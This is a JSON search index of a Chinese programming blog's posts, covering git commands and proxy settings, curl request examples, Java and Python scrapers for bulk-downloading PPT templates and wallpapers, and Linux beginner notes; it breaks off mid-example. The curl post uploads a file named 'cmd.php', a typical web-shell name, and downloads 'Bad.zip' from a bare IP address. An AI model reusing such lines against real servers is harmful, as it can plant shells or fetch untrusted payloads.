{"posts":[{"title":"Git commit提交规范","text":"Git commit提交规范 feat：新功能、新特性 fix：修改Bug docs：文档修改 style：不影响代码含义的更改（空白、格式、缺少分号等） refactor：代码重构（重构，在不影响代码内部行为、功能下的代码修改） perf：更改代码，以提高性能（在不影响代码内部行为的前提下，对程序性能进行优化） test：测试用例新增、修改 build：影响项目构建或依赖项修改 revert：恢复上一次提交 release：发布新版本 ci：持续集成相关文件修改 workflow：工作流相关文件修改 chore：其他修改（不在上述类型中的修改）","link":"/post/2022-09-01-git-commit/"},{"title":"Git常用命令合集","text":"Git常用命令合集 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147# 第一次初始化(方式1)：git initgit add .git commit -m 'first commit'git remote add origin git@github.com:帐号名/仓库名.gitgit pull origin mastergit push origin master # -f 强推# 第一次初始化(方式2)：git clone git@github.com:git帐号名/仓库名.git# 平时工作基本操作：git checkout master # 切到主分支git fetch origin # 获取最新变更git checkout -b dev origin/master # 基于主分支创建dev分支git add . # 添加到缓存git commit -m 'xxx' # 提交到本地仓库git fetch origin # 获取最新变更git rebase dev origin/master # 合并到主分支git push origin dev # 推送到远程分支git chekout master # 切到主分支git merge dev # 合并开发分支git clone -b 远程分支 仓库地址 # 本地不存在仓库 拉取远程分支代码git checkout -b 远程分支 origin/远程分支 # 本地存在仓库，拉取远程分支# 初始化仓库git init# 查看仓库当前状态git status# 将文件添加到仓库git add 文件名 # 将工作区的某个文件添加到暂存区 git add . # 将当前工作区的所有文件都加入暂存区git add -u # 添加所有被tracked文件中被修改或删除的文件信息到暂存区，不处理untracked的文件git add -A # 添加所有被tracked文件中被修改或删除的文件信息到暂存区，包括untracked的文件git add -i # 进入交互界面模式，按需添加文件到缓存区# 将暂存区文件提交到本地仓库git commit -m &quot;提交说明&quot; # 将暂存区内容提交到本地仓库git commit -a -m &quot;提交说明&quot; # 跳过缓存区操作，直接把工作区内容提交到本地仓库# 比较文件异同git diff # 工作区与暂存区的差异git diff 分支名 #工作区与某分支的差异，远程分支这样写：remotes/origin/分支名git diff HEAD # 工作区与HEAD指针指向的内容差异git diff 提交id 文件路径 # 工作区某文件当前版本与历史版本的差异git diff --stage # 工作区文件与上次提交的差异(1.6 版本前用 --cached)git diff 版本TAG # 查看从某个版本后都改动内容git diff 分支A 分支B # 比较从分支A和分支B的差异(也支持比较两个TAG)git diff 分支A...分支B # 比较两分支在分开后各自的改动# 另外：如果只想统计哪些文件被改动，多少行被改动，可以添加 --stat 参数 # 查看历史记录git log # 查看所有commit记录(SHA-A校验和，作者名称，邮箱，提交时间，提交说明)git log -p -次数 # 查看最近多少次的提交记录git log --stat # 简略显示每次提交的内容更改git log --name-only # 仅显示已修改的文件清单git log --name-status # 显示新增，修改，删除的文件清单git log --oneline # 让提交记录以精简的一行输出git log –graph –all --online # 图形展示分支的合并历史git log --author=作者 # 查询作者的提交记录(和grep同时使用要加一个--all--match参数)git log --grep=过滤信息 # 列出提交信息中包含过滤信息的提交记录git log -S查询内容 # 和--grep类似，S和查询内容间没有空格git log fileName # 查看某文件的修改记录，找背锅专用# 代码回滚git reset HEAD^ # 恢复成上次提交的版本git reset HEAD^^ # 恢复成上上次提交的版本，就是多个^，以此类推或用~次数git refloggit reset --hard 版本号--soft：只是改变HEAD指针指向，缓存区和工作区不变；--mixed：修改HEAD指针指向，暂存区内容丢失，工作区不变；--hard：修改HEAD指针指向，暂存区内容丢失，工作区恢复以前状态；# 同步远程仓库git push -u origin master# 删除版本库文件git rm 文件名 # 版本库里的版本替换工作区的版本git checkout -- test.txt# 本地仓库内容推送到远程仓库git remote add origin git@github.com:帐号名/仓库名.git# 从远程仓库克隆项目到本地git clone git@github.com:git帐号名/仓库名.git# 创建分支git checkout -b dev-b表示创建并切换分支上面一条命令相当于一面的二条：git branch dev //创建分支git checkout dev //切换分支# 查看分支git branch# 合并分支git merge dev #用于合并指定分支到当前分支git merge --no-ff -m &quot;merge with no-ff&quot; dev #加上--no-ff参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并# 删除分支git branch -d dev# 查看分支合并图git log --graph --pretty=oneline --abbrev-commit# 查看远程库信息git remote# git相关配置# 安装完Git后第一件要做的事，设置用户信息(global可换成local在单独项目生效)：git config --global user.name &quot;用户名&quot; # 设置用户名git config --global user.email &quot;用户邮箱&quot; #设置邮箱git config --global user.name # 查看用户名是否配置成功git config --global user.email # 查看邮箱是否配置# 其他查看配置相关git config --global --list # 查看全局设置相关参数列表git config --local --list # 查看本地设置相关参数列表git config --system --list # 查看系统配置参数列表git config --list # 查看所有Git的配置(全局+本地+系统)git config --global color.ui true //显示git相关颜色# 撤消某次提交git revert HEAD # 撤销最近的一个提交git revert 版本号 # 撤销某次commit# 拉取远程分支到本地仓库git checkout -b 本地分支 远程分支 # 会在本地新建分支，并自动切换到该分支git fetch origin 远程分支:本地分支 # 会在本地新建分支，但不会自动切换，还需checkoutgit branch --set-upstream 本地分支 远程分支 # 建立本地分支与远程分支的链接# 标签git tag 标签 //打标签命令，默认为HEADgit tag //显示所有标签git tag 标签 版本号 //给某个commit版本添加标签git show 标签 //显示某个标签的详细信息# 同步远程仓库更新git fetch origin master","link":"/post/2022-09-04-git-command/"},{"title":"Jsoup批量爬取第一PPT","text":"Jsoup批量爬取第一PPT 添加依赖123456789101112&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.jsoup&lt;/groupId&gt; &lt;artifactId&gt;jsoup&lt;/artifactId&gt; &lt;version&gt;1.14.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213import org.apache.commons.io.FileUtils;import org.jsoup.Jsoup;import org.jsoup.nodes.Document;import org.jsoup.nodes.Element;import org.jsoup.select.Elements;import java.io.File;import java.io.IOException;import java.net.URISyntaxException;import java.net.URL;import java.util.ArrayList;import java.util.List;/** * 分类 */class Category { private final String name; private final String url; public Category(String name, String url) { this.name = name; this.url = url; } public String getName() { return name; } public String getUrl() { return url; } @Override public String toString() { return &quot;分类名称: &quot; + getName() + &quot;\\t\\t&quot; + &quot;分类地址: &quot; + getUrl(); }}/** * PPT */class PPT { private final String imgUrl; private final String name; private final String url; public PPT(String imgUrl, String name, String url) { this.imgUrl = imgUrl; this.name = name; this.url = url; } public String getImgUrl() { return imgUrl; } public String getName() { return name; } public String getUrl() { return url; } @Override public String toString() { return &quot;名称: &quot; + getName() + &quot;\\t\\t&quot; + &quot;图片地址: &quot; + getImgUrl() + &quot;\\t\\t&quot; + &quot;内容地址: &quot; + getUrl(); }}/** * 下载地址 */class DownloadUrl { private final String one; private final String two; public DownloadUrl(String one, String two) { this.one = one; this.two = two; } public String getOne() { return one; } public String getTwo() { return two; } @Override public String toString() { return &quot;下载地址一: &quot; + getOne() + &quot;\\t\\t&quot; + &quot;下载地址二: &quot; + getTwo(); }}public class OnePPT { private static final String SERVER_URL = &quot;http://www.1ppt.com&quot;; private static final String ROOT_DIR = &quot;D:\\\\OnePPT\\\\&quot;; public static void main(String[] args) throws IOException, URISyntaxException { List&lt;Category&gt; categories = requestCategory(); for (Category category : categories) { System.out.println(category); File file = new File(ROOT_DIR + category.getName()); if (!file.exists()) { file.mkdir(); } String[] strings = category.getUrl().split(&quot;/&quot;); List&lt;PPT&gt; pptList = requestCategoryAll(category.getUrl(), strings[strings.length - 1]); for (PPT ppt : pptList) { System.out.println(ppt); DownloadUrl downloadUrl = requestDownloadUrls(requestDownloadPageUrl(ppt.getUrl())); System.out.println(downloadUrl); String filePath = ROOT_DIR + category.getName() + &quot;\\\\&quot; + ppt.getName() + &quot;.zip&quot;; FileUtils.copyURLToFile(new URL(downloadUrl.getOne()), new File(filePath)); System.out.println(&quot;下载完成 =&gt; &quot; + filePath); System.out.println(); } } } /** * 获取分类列表 * * @return * @throws IOException */ public static List&lt;Category&gt; requestCategory() throws IOException { Document root = Jsoup.connect(SERVER_URL).get(); Elements nav = root.getElementsByClass(&quot;col_nav i_nav clearfix&quot;); Elements list = nav.select(&quot;ul li a&quot;); List&lt;Category&gt; categories = new ArrayList&lt;&gt;(); list.forEach(element -&gt; categories.add(new Category(element.attr(&quot;title&quot;), SERVER_URL + element.attr(&quot;href&quot;)))); return categories; } /** * 获取分类中的PPT * * @param url * @return * @throws IOException */ public static List&lt;PPT&gt; requestByCategory(String url) throws IOException { Document root = Jsoup.connect(url).get(); Elements list = root.getElementsByClass(&quot;tplist&quot;).select(&quot;li&quot;); List&lt;PPT&gt; data = new ArrayList&lt;&gt;(); list.forEach(element -&gt; data.add(new PPT(element.select(&quot;img&quot;).attr(&quot;src&quot;), element.select(&quot;img&quot;).attr(&quot;alt&quot;), SERVER_URL + element.select(&quot;a&quot;).attr(&quot;href&quot;)))); return data; } /** * 获取下载页面地址 * * @param url * @return * @throws IOException */ public static String requestDownloadPageUrl(String url) throws IOException { Document root = Jsoup.connect(url).get(); return SERVER_URL + root.getElementsByClass(&quot;downurllist&quot;).get(0).select(&quot;li a&quot;).attr(&quot;href&quot;); } /** * 获取下载地址 * * @param url * @return * @throws IOException */ public static DownloadUrl requestDownloadUrls(String url) throws IOException { Document root = Jsoup.connect(url).get(); Elements list = root.getElementsByClass(&quot;downloadlist&quot;); Elements li = list.get(0).select(&quot;li a&quot;); return new DownloadUrl(li.get(0).select(&quot;a&quot;).attr(&quot;href&quot;), li.get(1).select(&quot;a&quot;).attr(&quot;href&quot;)); } /** * 获取下一页地址 * * @param url 当前页面地址 * @return * @throws IOException */ public static String requestNextPageUrl(String url, String category) throws IOException { Document root = Jsoup.connect(url).get(); Elements pageLi = root.getElementsByClass(&quot;pages&quot;).select(&quot;li&quot;); Element element = pageLi.get(pageLi.size() - 2); if (element.select(&quot;a&quot;).text().equals(&quot;下一页&quot;)) { return SERVER_URL + &quot;/moban/&quot; + category + &quot;/&quot; + pageLi.get(pageLi.size() - 2).select(&quot;a&quot;).attr(&quot;href&quot;); } return null; } /** * 获取某分类下所有的PPT * * @return */ public static List&lt;PPT&gt; requestCategoryAll(String url, String category) throws IOException { List&lt;PPT&gt; data = new ArrayList&lt;&gt;(requestByCategory(url)); String currentUrl = url; while ((currentUrl = requestNextPageUrl(currentUrl, category)) != null) { data.addAll(requestByCategory(currentUrl)); } return data; }}","link":"/post/2022-05-05-ppt/"},{"title":"Git设置代理","text":"Git设置代理 1234567891011121314151617181920# 设置全局代理# httpgit config --global https.proxy http://127.0.0.1:1080# httpsgit config --global https.proxy https://127.0.0.1:1080# socks5git config --global http.proxy socks5://127.0.0.1:1080git config --global https.proxy socks5://127.0.0.1:1080 # 只对github.com使用代理，其他仓库不走代理git config --global http.https://github.com.proxy socks5://127.0.0.1:1080git config --global https.https://github.com.proxy socks5://127.0.0.1:1080# 取消github代理git config --global --unset http.https://github.com.proxygit config --global --unset https.https://github.com.proxy # 取消全局代理git config --global --unset http.proxygit config --global --unset https.proxy","link":"/post/2022-09-04-git-proxy/"},{"title":"Linux中使用CURL模拟网络请求","text":"Linux中使用CURL模拟网络请求 GET请求1234@GetMapping(&quot;/demo1&quot;)public String demo1(String name, String age) { return &quot;demo01 =&gt; name = &quot; + name + &quot; age = &quot; + age;} 1234# -G GET请求# -d 表单参数curl localhost:8080/demo1 -G -d &quot;name=Andu&amp;age=20&quot;demo01 =&gt; name = Andu age = 20 POST表单请求1234@PostMapping(&quot;/demo2&quot;)public String demo2(String name, String age) { return &quot;demo02 =&gt; name = &quot; + name + &quot; age = &quot; + age;} 123# 默认则为POST请求curl localhost:8080/demo2 -d &quot;name=Andu&amp;age=20&quot;demo02 =&gt; name = Andu age = 20 文件上传请求1234@PostMapping(&quot;/demo3&quot;)public String demo3(String name,MultipartFile file) { return &quot;dem03 =&gt; name = &quot; + name + &quot; file = &quot; + file.getOriginalFilename();} 123# 模拟http表单提交数据curl localhost:8080/demo3 -F &quot;name=submit&quot; -F &quot;file=@C:\\\\Users\\\\BPDBSIR\\\\Desktop\\\\cmd.php&quot;dem03 =&gt; name = submit file = cmd.php POST/JSON请求1curl -l -H &quot;Content-type: application/json&quot; -X POST -d '{&quot;phone&quot;:&quot;13521389587&quot;,&quot;password&quot;:&quot;test&quot;}' URL 文件下载请求1curl http://1.15.235.91:8000/Bad.zip -O 发送Cookie123456789101112131415161718curl URL --cookie &quot;xxx&quot;# 将cookie另存为一个文件，使用--cookie-jarcurl URL --cookie-jar cookie_file# -b 参数用来向服务器发送 Cookiecurl -b 'foo=bar' https://taobao.com# 上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookiecurl -b 'foo1=bar' -b 'foo2=baz' https://taobao.com# 上面命令发送两个 Cookie。curl -b cookies.txt https://www.taobao.com# 上面命令读取本地文件 cookies.txt，里面是服务器设置的 Cookie（参见-c参数），将其发送到服务器。 自定义请求头123456789curl -H 'Accept-Language: en-US' https://google.com# 上面命令添加 HTTP 标头 Accept-Language: en-US。curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com# 上面命令添加两个 HTTP 标头。curl -d '{&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;}' -H 'Content-Type: application/json' https://google.com/login# 上面命令添加 HTTP 请求的标头是 Content-Type: application/json，然后用 -d 参数发送 JSON 数据。 设置用户代理字符串有些网站访问会提示只能使用IE浏览器来访问，这是因为这些网站设置了检查用户代理，可以使用curl把用户代理设置为IE，这样就可以访问了。使用–user-agent或者-A选项： 12curl URL --user-agent &quot;Mozilla/5.0&quot;curl URL -A &quot;Mozilla/5.0&quot; 其他HTTP头部信息也可以使用curl来发送，使用-H”头部信息” 传递多个头部信息，例如： 1curl -H &quot;Host:URL&quot; -H &quot;accept-language:zh-cn&quot; URL","link":"/post/2022-05-01-curl/"},{"title":"Python第一PPT批量爬取","text":"Python第一PPT批量爬取 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsfrom bs4 import BeautifulSoupimport rebase_url = &quot;http://www.1ppt.com&quot;root_dir = &quot;E:\\\\第一PPT\\\\简洁\\\\&quot;def requestDetail(): res = requests.get(base_url + &quot;/moban/jianjie/&quot;) res.encoding = &quot;GB2312&quot; soup = BeautifulSoup(res.text, 'html.parser') i = 0 result = set() for item in soup.find_all(&quot;a&quot;, href=re.compile(&quot;/article&quot;)): result.add(base_url + item[&quot;href&quot;]) for iss in result: con = requests.get(iss) con.encoding = &quot;GB2312&quot; con_soup = BeautifulSoup(con.text, &quot;html.parser&quot;) title_div = con_soup.find(&quot;div&quot;, &quot;ppt_info clearfix&quot;) title = title_div.contents[1].string down_ul = con_soup.find(&quot;ul&quot;, &quot;downurllist&quot;) down_url = base_url + down_ul.contents[1].contents[0][&quot;href&quot;] file_soup = BeautifulSoup(requests.get(down_url).text, &quot;html.parser&quot;) file_url = file_soup.find(&quot;li&quot;, &quot;c1&quot;).contents[0][&quot;href&quot;] print(&quot;名称 =&gt; %s 介绍地址 =&gt; %s 下载链接 =&gt; %s &quot; % (title, down_url, file_url)) with open(root_dir + title + &quot;.zip&quot;, &quot;wb&quot;) as f: f.write(requests.get(file_url).content)def requestCategory(): cate = requests.get(base_url) cate.encoding = &quot;GB2312&quot; cate_soup = BeautifulSoup(cate.text, &quot;html.parser&quot;) dd = cate_soup.find_all(&quot;a&quot;, href=re.compile(r'^/moban')) for n in dd: print(n) # cate_ul = cate_soup.find(&quot;div&quot;, &quot;col_nav i_nav clearfix&quot;) # for item in cate_ul: # print(type(item))requestCategory()","link":"/post/2022-05-01-oneppt/"},{"title":"Python批量爬取Wallhaven壁纸到本地","text":"Python批量爬取Wallhaven壁纸到本地 安装依赖包1234# requestspip install requests# bs4pip install beautifulsoup4 代码1234567891011121314151617181920212223242526272829303132333435import requestsfrom bs4 import BeautifulSoup&quot;&quot;&quot;wallhaven.cc&quot;&quot;&quot;def requestWallHaven(page, root_dir): &quot;&quot;&quot; 壁纸数据爬取 :param page: 页数 :param root_dir: 图片存放地址 :return: &quot;&quot;&quot; res = requests.get(&quot;https://wallhaven.cc/hot?page=&quot; + page).text soup = BeautifulSoup(res, &quot;html.parser&quot;) for item in soup.find_all(&quot;a&quot;, &quot;preview&quot;): print(&quot;页面地址: %s&quot; % item.get(&quot;href&quot;)) body = requests.get(item.get(&quot;href&quot;)).text body_soup = BeautifulSoup(body, &quot;html.parser&quot;) img_url = body_soup.find(&quot;img&quot;, id=&quot;wallpaper&quot;).get(&quot;src&quot;) print(&quot;图片地址: %s&quot; % img_url) data = img_url.split(&quot;/&quot;) file_name = data[len(data) - 1] print(&quot;文件名称: %s &quot; % file_name) with open(root_dir + file_name, &quot;wb&quot;) as f: f.write(requests.get(img_url).content) print(&quot;Page =&gt; %s Success！&quot; % page)if __name__ == '__main__': # Current-Page 32 for i in range(32, 130): requestWallHaven(str(i), &quot;E:\\\\Wallhaven\\\\&quot;) print(&quot;全部下载完毕！&quot;)","link":"/post/2022-05-01-wallhaven/"},{"title":"Linux笔记","text":"Linux应用领域 Linux下部署项目Java EE 大数据 Python PHP C/C++ GO Linux运维工程师 Linux嵌入式工程师 个人桌面领域的应用 服务器领域linux在服务器领域的应用时最强的linux免费、稳定、高校等特点在这里得到了很好的体现，尤其在一些高端领域尤为广泛 嵌入式领域机顶盒、数字电视、网络电话、程控交换机、手机、PDA、智能家居 Linux概述如何读？黎纽克斯 linux时一个操作系统，我们使用的过程中都会用到做应用的部署 常见的操作系统 Windows、IOS、Windows、Android、MacOS、Linux 吉祥物？企鹅 VMware虚拟机安装CentOS7.X安装网络连接的三种模式桥接模式NAT模式XX模式虚拟机克隆如果你已经安装了一台linux操作系统，你还想要更多的，没有必要在重新安装，你只需要克隆就可以了 方式一：直接拷贝一份安装好的虚拟机文件 方式二：使用vmware的克隆操作 注意，克隆时，需要先关闭linux系统 虚拟机快照如果你在使用虚拟机操作的时候，你想回到原先的某一个状态，也就是说你担心可能有些失误的操作造成系统异常，需要回到原先某个正常运行的状态，wmare也提供了这样的功能，就叫快照管理。 安装好系统之后，先做一个快照A 进入到系统，创建一个文件夹，在保存一个快照B 回到系统刚刚安装好的状态，即 快照A 试试看，是否还能再次回到快照B 虚拟机的迁移和删除虚拟系统安装好了，它的本质就是文件(访问文件夹的)，英雌虚拟系统的迁移很方便，你可以把安装好的虚拟系统这个文件夹整体拷贝u哦这剪切到另外位置使用，删除也很简单，使用wmare进行移除，在点击菜单 =&gt; 从磁盘删除即刻，或者直接手动删除虚拟系统对应的文件夹即可。 vmtoolsvmtools安装后，可以让我们在windows下更好的管理虚拟机 可以设置windows和centos的共享文件夹 安装vmtools的步骤 进入centos 点击vm菜单的 =&gt; instakk wmware tools centos会出现一个vm的安装包，xx.tar.gz 拷贝到/opt 使用解压命名tar，得到一个安装文件 cd /opt 进入到opt目录 tar -zxvg xx.tar.gz 使用该vm解压的目录，/opt目录下 安装./vmware-install.pl 全部使用默认设置即可，就可以安装成功 注意：安装vmtools，需要有gcc Linux目录结构 Linux的文件i系统采用该层级方式的目录结构，在此结果中最上层时根目录，然后子啊此目录下在创建其他目录 深刻理解linux树状目录时非常重要的 在linux的世界里，一些皆为文件 目录结构： root root用户用到的文件 一般的用户进入不到此文件夹 boot 启动系统的核心文件，如果把这个文件夹删除，则系统会无法启动 dev 设备管理器 linux会将硬件映射成一个文件来管理 home 系统中所有的用户 比如 有一个用户andu 则/home/andu就有此文件夹 bin 存放常用的命令 sbin Super Bin 存在的时管理员使用的系统管理程序 etc 所有的系统管理所需要的配置我呢见和子目录 my.conf lib 系统卡机所需要最基本的动态连接共享库 usr 用户的横夺应用程序和文件都放在这个目录下，类似于Windows下的Program Files目录下 proc 虚拟目录，它是系统内存的映射， 访问这个目录来获取系统信息 srv server做些，该目录存在一些服务启动之后需要提取的数据 sys 这是linux2.6内核的一个很大的变化，该目录下安装了2.6内核中新出现的一个文件系统sysfs tmp 存在一些临时文件的 media linux系统会自动识别一些设备，例如U盘、、光驱、当识别后，linux会把识别的设备挂载到这个目录下 mnt 系统提供该目录时为了让用户零食挂载别的文件系统的，我们可以将外部的储存挂载在/mnt上，然后进入该目录就可以查看里面的内容了 opt 这是给主机额外安装软件所摆放的目录，如安装Oracle数据库就可以放在该目录下，默认为空 usr/local 这是另一个给主机额外安装软件所安装的目录，一般时通过编译源码方式安装的程序 var 这个目录中存放着不断扩充着的东西，习惯将经常背修改的目录放在这个目录下，包括各种日志文件 selinux SELinux是一种安全子系统它能控制程序只能访问特定文件，有三种工作模式，可以自行设置 远程登录公司实际开发中，具体的应用场景时这样的 linux服务器时开发小组共享的 正式上线的项目时运行在公网 因此程序员需要远程登录到Linux服务器上面进行项目管理 远程登录客户端有XShell，XFtp，MobaXterm，使用方式都差不多 远程文件传输使用XFtp或者MobaXterm vi/vim快熟入门Linux系统会内置vi文本编辑器 Vim具有程序编辑的能力，可以看作时vi的增强版本，可以主动的以字体的颜色辨别语法的正确性，方便程序设计，代码补全。 正常模式以vim打开一个档案可以直接进入一般模式(这里时默认的模式)。在这个模式中，你可以使用【上下左右】按键来移动光标，你可以使用【删除字符】或【删除整行】来处理档案的内容，也可以使用【复制、粘贴】来处理你的文本数据。 插入模式按下i、I、o、O、a、A、r、R、等任何一个字母之后才会进入编辑模式，一般来说按i比较常用 命令行模式当前在编辑模式下，先按ESC，在输入:(冒号)输入需要执行的命令即可，在这个模式中，可以提供你相关的命令，完成读取、存盘、替换、离开vim、显示行号等的动作，则时在模式中达成的！ 使用vim开发一个Hello.java程序： 12345public class Hello{ public static void main(String[] args){ System.out.println(&quot;Hello World!&quot;); }} vim的快捷键在命令行下输入vim 文件名进入正常模式， 如果需要进入编辑模式就按i，然后就可以写内容了 写完之后需要进入命令模式，先按ESC，在输入：冒号，冒号后面紧接着命令，即可完成整个流程。 (:wq保存并退出 :q退出 :q!强制退出并且不保存) 如无特殊说明，则为 一般模式 拷贝当前行yy，拷贝当前行向下的5行，5yy，并粘贴 p 删除当前行dd，删除当前行向下的5行，5dd 在文件中查找某个单词【命令行模式下 /关键字，回车 查找，输入n就是查找下一个】 设置文件的行号，取消文件的行号【命令行下:set nu和:set nonu】 编辑/etc/prfile文件，使用快捷键到该文档的最末行[G]和最首行[gg] 在一个文件中输入”hello”，然后又撤销这个动作 u 编辑/ect/profile文件，并将光标移动到20行 shift + g 开启、重启和用户的登录、注销shutdown -h now 立刻继续宁关机 shuedown -h 1 1分钟之后关机 shutdown -r now 现在重新启动计算机 halt 关机，作用和上面一样 reboot 现在重新启动计算机 sync 把内存的数据同步到磁盘 注意事项： 1、不管是重启系统还是关系系统，首先要运行sync命令，把内存中的数据写入到磁盘中 2、目前的shutdown、reboot、halt等命令已经在关机前进行了sync。 登录注销： 1、登录时尽量少用root账号登录，因为它是系统管理员，最大的权限，避免操作失误，可以利用普通用户登录，登录后在使用”su - 用户名”来切换成系统管理员身份 2、在提示符下输入logout即可注销用户 使用细节：logout注销指令在图形运行级别无效，在指令运行级别有效 Linux用户管理Linux是一个多用户多任务的操作系统，任何一个要使用系统i资源的用户，都必须首先向系统管理员申请一个账号，然后以这个账号的身份进入系统 添加用户useradd 用户名 1、当创建用户成功后，会自动的创建和用户名的home目录 2、也可以通过useradd -d 指定目录，新的用户名，给新创建的用户指定home目录。 useradd andrew 自动会在/home/andrew创建一个andrew文件夹 指定/修改密码passwd 用户名 如果不指定用户名就会给当前的用户修改密码！！！ passwd andrew 删除用户userdel 用户名 1、删除用户andrew，但是要保留/home/andrew目录(默认) 2、删除用户以及主目录 userdel -r andrew 一般情况下，建议保留用户的home目录 查询用户信息id 用户名 切换用户在操作Linux中，如果当前用户的权限不够。可以使用su - 指令，切换到高权限用户，比如root su - 用户名 1、从权限高用户切换到权限低得用户，不需要输入密码，反之需要 2、当需要返回到原来得用户时，使用exit/logout指令 查看当前用户/登录用户whoami/ who am I 用户组类似于角色，系统可以对有共性得多个用户进行统一的管理 新增组groupadd 组名 删除组groupdel 组名 增加用户时直接加上组useradd -g 用户组 用户名 修改用户的组usermod -g 用户组 用户名 用户和组相关文件 /etc/passwd文件用户(user)的配置文件，记录用户的各种信息每行的含义：用户名:口名:用户标识号:组标识号:注释性描述:主目录:登录Shell /etc/shadow文件口令的配置文件每行的含义：登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不阔东时间:失效时间:标志 /etc/group文件组(group)的配置文件，记录Linux包含的组的信息每行含义：组名:口令:组标识号:组内用户列表 运行级别运行级别说明： 0：关机 1：单用户(找回丢失密码) 2：多用户状态没有网络服务 3：多用户状态有网络服务 4：系统未使用保留给用户 5：图形界面 6：系统重启 常用运行级别是3和5，也可以执行默认运行级别 应用实例：init[0 1 2 3 4 5 6] 应用案例：通过init来切换不同得运行级别，比如动5-3，然后关机 指定默认运行级别在CentOS7以前，/etc/inittab文件中，进行了简化，如下： multi-user.target: andlogous to runlevel 3 graphical.target: andlogous to runlevel 5 查看默认运行级别systemctl get-default 设置默认运行级别systemctl set-default mluti-user.target 找回root密码如何找回root密码？ 有很多方式，最简单的方式就是登录阿里云平台从控制面板修改 帮助指令man获取帮助信息 man [命令或者配置文件] (功能描述:获取帮助信息) man ls linux下隐藏文件时以.开头的 ls -la &amp;&amp; ls -al 命令可以组合输入，并且不需要注重顺序 help指令 获得shell内置帮助文档 百度搜索 文件目录pwd 显示当前工作目录的绝对路径 ls 查看当前目录下的文件信息 ls：查看当前目录下 的文件 ls -l：显示文件的详细信息，权限，大小….. **cd 切换目录 ** cd ~ ：回到自己的home目录 cd ..：回到上一级 cd 文件夹名称：切换到当前目录下的某个文件夹 cd 绝对路径：切换绝对路径下的文件夹 mkdir 创建目录 mkdir [选项] 要创建的目录 选项： -p：创建多级目录 创建单级目录：mkdir hello 创建多级目录：mkdir -p /www/xiaoyes rmdir 删除空目录 rmdir [选项] 要删除的目录名称 rmdir删除的时空目录，如果目录下有内容则是无法删除的 如果要删除非空目录，需要使用rm -rf 要删除的目录，谨慎使用！ touch 创建空文件 touch 文件名称 cp 拷贝 cp [选项] 要拷贝的文件 拷贝到哪里 选项： -r：递归复制整个文件 rm 移除文件或者目录 rm [选项] 要删除的文件或者目录 选项： -r：递归删除整个文件夹 -f：强制删除不提示 mv 移动文件与目录或者重命名 mv oldFile newFile 就是重命名 mv /temp/moveFile /targetFolder 移动文件 cat 查看文件内容 cat [选项] 要查看的文件 选项： -n：显示行号 cat Hello.java cat -n Hello.java cat -n Hello.java | more 竖杠表示管道命令 more 按页显示文本文件内容 more执行时一个基于vi编辑器的文本过滤器，它以全屏幕的方式按页显示文本文件的内容，more指令中内置了若干快捷键。 more 要查看的文件 操作 功能说明 空白键(space) 代表向下翻一页 Enter 向下翻一行 q 立即离开more Ctrl + F 向下滚动一屏 Ctrl + B 返回上一层 = 输出当前行号 :f 输出文件名和当前行号 less 分屏查看文件内容 less指令用来分屏查看文件内容，它的功能与more指令类似，但是比more指令更加强大，支持各种显示终端。less指令在显示文件内容时，并不是一次将整个文件加载之后才显示，而是根据显示需要加载内容，对于大型文件具有较高的效率。 less 要查看的文件 操作 功能说明 空白键 向下翻动一页 [pagedown] 向下翻动一页 [pageup] 向上翻动一页 /字串 向下搜寻[字串]的功能; n : 向下查找；N : 向上查找 ?字串 向上搜寻[字串]的功能; n : 向上查找；N : 向下查找 q 离开less这个程序 echo 输入信息到控制台 echo [选项] [输出内容] 使用echo指令输出环境变量 echo $PATH 使用echo指令树池Hello World！ head 显示文件开头部分内容 head用于显示文件的开头部分内容，默认情况下head指令显示文件的前10行内容 head 文件 查看文件头10行内容 head -n 5 文件 查看文件头5行内容，5可以是任意行数 tail 显示文件尾部的内容 tail用于输出文件中尾部的内容，默认情况下tail指令显示文件的后10行内容 tail 文件 查看文件后10行内容 tail -n 5 文件 查看文件后5行内容，5可以是任意行数 tail -f 文件 实时追踪该文档的所有更新 &gt; 指令 和 &gt;&gt; 指令 一个箭头表示覆盖 两个箭头表示追加 ls -l &gt; 文件 列表的内容写入文件a.txt中(覆盖写) ls -al &gt;&gt; 文件 列表的内容追加到文件aa.txt的末尾 cat 文件1 &gt; 文件2 将文件1的内容覆盖到文件2 echo “内容” &gt;&gt; 文件 案例： 将/home目录下文件列表写入到/home/info.txt中 ls -l /home &gt; /home/info.txt 如果info.txt不存在则回自动创建 123456# 写入的结果drwx------. 15 andu andu 4096 9月 14 11:59 andu-rw-r--r--. 1 root root 0 9月 14 09:54 haha.txt-rw-r--r--. 1 root root 0 9月 14 12:12 info.txt-rw-r--r--. 1 root root 12136 9月 14 10:20 text.txtdrwx------. 3 1001 1001 4096 9月 13 14:38 zwj 将当前日历信息追加到/home/mycal文件中 cal &gt;&gt; /home/mycal 12345678# 写入的结果九月 2021 日 一 二 三 四 五 六 1 2 3 4 5 6 7 8 9 10 1112 13 14 15 16 17 1819 20 21 22 23 24 2526 27 28 29 30 ln 软链接也称为符号链接 类似于Windows里的快捷方式，主要存放了链接其他文件的路径 ln -s [原文件或目录] [软链接名] 给原文件创建一个软链接 案例： 在/home目录下创建一个软链接myroot，链接到/root目录 12345678ln -s /root /home/myroot[root@andu01 /]# cd home[root@andu01 home]# lsandu 